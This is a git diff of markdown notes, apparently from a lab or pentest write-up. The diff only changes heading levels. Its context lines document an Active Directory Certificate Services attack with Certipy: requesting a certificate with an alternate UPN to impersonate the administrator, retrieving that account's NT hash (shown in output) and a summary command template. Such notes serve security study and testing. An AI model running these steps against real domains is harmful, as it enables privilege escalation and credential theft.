@@ -10,7 +10,7 @@ The following prerequisites must apply:
 ![[Pasted image 20241005175132.png]]
 
 
-### Certificate Request
+#### Certificate Request
 
 Use the `-upn` to specify the alternative subject. In this case the Administrator:
 
@@ -26,7 +26,7 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
 [*] Saved certificate and private key to 'administrator.pfx'
 ```
 
-### Certificate Authentication
+#### Certificate Authentication
 
 We can retrieve the NTLMv1 hash for the targeted user:
 
@@ -41,8 +41,7 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
 [*] Trying to retrieve NT hash for 'administrator'
 [*] Got hash for 'administrator@essos.local': aad3b435b51404eeaad3b435b51404ee:54296a48cd30259cc88095373cec24da
 ```
-
-### Summary
+#### Summary
 
 ```bash
 certipy req -u <user>@<domain> -p '<password>' -template <template> -ca <ca> -upn <target_user>@<domain -dc-ip <adcs_ip>
